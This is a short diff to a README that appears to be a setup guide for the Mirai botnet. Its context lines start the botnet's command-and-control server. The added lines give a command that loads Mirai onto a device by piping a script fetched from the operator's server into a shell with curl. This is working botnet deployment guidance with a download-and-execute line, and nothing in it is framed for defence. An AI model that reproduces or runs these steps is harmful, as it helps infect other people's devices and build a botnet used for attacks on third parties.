@@ -143,3 +143,10 @@ Now lets run the cnc:
 cd release
 sudo screen -dmS mirai-cnc ./cnc
 ```
+<br>
+
+If you did everything right you can now load mirai onto a device with:
+```
+curl http://<your ip>/bins/bins.sh |sh
+```
+<br>
